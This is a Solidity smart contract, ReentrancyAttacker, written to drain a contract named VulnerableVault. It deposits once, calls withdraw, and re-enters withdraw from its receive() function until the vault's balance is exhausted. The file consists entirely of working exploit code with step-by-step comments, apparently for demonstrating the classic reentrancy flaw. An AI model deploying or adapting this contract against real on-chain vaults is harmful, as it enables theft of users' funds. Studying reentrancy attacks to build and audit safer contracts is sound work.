// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/// @title ReentrancyAttacker
/// @notice Demonstrates how to drain `VulnerableVault` by re-entering `withdraw`
///         from the contract's `receive()` function while the victim balance has
///         not been updated yet.
contract ReentrancyAttacker {
    /// @notice The vault contract being attacked.
    IVulnerableVault public immutable VAULT;

    /// @notice Amount used per (re)entry into `withdraw`.
    ///         Also doubles as the attacker's initial deposit, so the vault's
    ///         `balances[attacker] >= amount` check passes on the first call.
    uint256 public immutable ATTACK_UNIT;

    constructor(address vaultAddress, uint256 attackUnit) {
        VAULT = IVulnerableVault(vaultAddress);
        ATTACK_UNIT = attackUnit;
    }

    /// @notice Kick off the attack. Must be called with exactly `ATTACK_UNIT` wei
    ///         so this contract has a valid deposit recorded inside the vault.
    function attack() external payable {
        require(msg.value == ATTACK_UNIT, "send exact attack unit");

        // Step 1: become a depositor so the vault's balance check passes.
        VAULT.deposit{value: ATTACK_UNIT}();

        // Step 2: trigger the first withdraw. The vault will send ETH back to
        // this contract before zeroing out our balance, which lets `receive()`
        // re-enter `withdraw` repeatedly until the vault is empty.
        VAULT.withdraw(ATTACK_UNIT);
    }

    /// @notice Re-entry point. Triggered whenever the vault sends ETH here.
    ///         While the vault still has funds, we call `withdraw` again.
    receive() external payable {
        if (address(VAULT).balance >= ATTACK_UNIT) {
            VAULT.withdraw(ATTACK_UNIT);
        }
    }
}
